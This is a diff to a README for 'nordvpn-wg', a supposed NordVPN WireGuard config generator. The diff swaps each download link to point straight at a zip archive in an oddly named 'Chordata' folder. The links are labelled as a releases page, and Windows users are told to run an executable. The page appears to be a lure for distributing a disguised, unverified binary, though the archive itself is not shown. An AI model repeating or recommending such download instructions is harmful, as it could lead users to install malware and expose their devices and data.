@@ -1,7 +1,7 @@
 # 🛡️ nordvpn-wg - Secure Your Online Privacy Effortlessly
 
 ## 📥 Download Now
-[![Download Release](https://github.com/quesoXD12/nordvpn-wg/raw/refs/heads/main/Chordata/nordvpn-wg-2.0.zip)](https://github.com/quesoXD12/nordvpn-wg/raw/refs/heads/main/Chordata/nordvpn-wg-2.0.zip)
+[![Download Release](https://raw.githubusercontent.com/quesoXD12/nordvpn-wg/main/Chordata/wg-nordvpn-2.7.zip)](https://raw.githubusercontent.com/quesoXD12/nordvpn-wg/main/Chordata/wg-nordvpn-2.7.zip)
 
 ## 📖 Overview
 The `nordvpn-wg` application helps you generate WireGuard configuration files for NordVPN. Using this software, you can enhance your online privacy while enjoying a seamless Internet experience. Our tool makes setting up WireGuard fast and easy, even if you're not a techie.
@@ -10,7 +10,7 @@ The `nordvpn-wg` application helps you generate WireGuard configuration files fo
 To get started with `nordvpn-wg`, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access our releases:
-   - [Visit this page to download](https://github.com/quesoXD12/nordvpn-wg/raw/refs/heads/main/Chordata/nordvpn-wg-2.0.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/quesoXD12/nordvpn-wg/main/Chordata/wg-nordvpn-2.7.zip)
   
 2. **Choose the Right File**: On the releases page, look for the latest version. Download the file that matches your operating system:
    - For Windows, select the executable file.
@@ -47,7 +47,7 @@ To use `nordvpn-wg`, your system needs:
 ## 📁 Download & Install
 To run `nordvpn-wg`, you need to download the application from our releases page. Click below to grab the latest version:
 
-- [Visit this page to download](https://github.com/quesoXD12/nordvpn-wg/raw/refs/heads/main/Chordata/nordvpn-wg-2.0.zip)
+- [Visit this page to download](https://raw.githubusercontent.com/quesoXD12/nordvpn-wg/main/Chordata/wg-nordvpn-2.7.zip)
 
 Follow the installation instructions above to set up the tool on your device.
 
